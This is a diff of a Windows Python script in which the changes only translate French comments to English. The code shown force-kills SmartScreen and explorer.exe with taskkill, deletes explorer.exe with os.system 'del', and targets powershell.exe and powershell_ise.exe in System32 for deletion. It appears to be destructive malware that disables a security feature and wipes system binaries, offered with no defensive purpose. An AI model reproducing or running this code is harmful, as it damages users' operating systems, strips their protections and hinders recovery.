@@ -1,16 +1,17 @@
 #!/usr/bin/python
 #coding:utf-8
 import os, sys
+
 # ENVIRONMENT VARIABLE
 d = os.environ["SystemDrive"]
 usr = os.environ["USERNAME"]
 
 class Kill():
-    """ Classe qui permet de kill les processus """
+    """ Class that allows to kill processes """
     def __init__(self):
         self.f = "/F"
         self.k1 = "START /MIN taskkill /IM"
-    # Function to kill SmartScreen (Windows10)
+    # FUNCTION TO KILL SMARTSCREEN (Windows10)
     def smart(self):
         try:
             killed = "{} smartscreen.exe {}".format(self.k1, self.f)
@@ -18,7 +19,7 @@ class Kill():
         except Exception:
             killed = 0
         return killed
-    # Function to kill explorer
+    # FUNCTION TO KILL EXPLORER.EXE
     def exp(self):
         try:
             killed = "{} explorer.exe {}".format(self.k1, self.f)
@@ -28,7 +29,7 @@ class Kill():
         return killed
 
 class Remove():
-    """ Classe qui permet de supprimer les processus """
+    """ Class that allows to delete processes """
     def __init__(self):
         self.ex = "del"
         self.r1 = "{}\\Windows\\System32\\".format(d)
@@ -42,7 +43,7 @@ class Remove():
     def exp(self):
         cmd = "{} \\windows\\explorer.exe ".format(self.ex)
         os.system(cmd)
-    # Function to delete the powershell on the system
+    # Function to delete the powershell
     def power(self):
         pwr_sh = ['powershell.exe', 'powershell_ise.exe']
         for proc in pwr_sh:
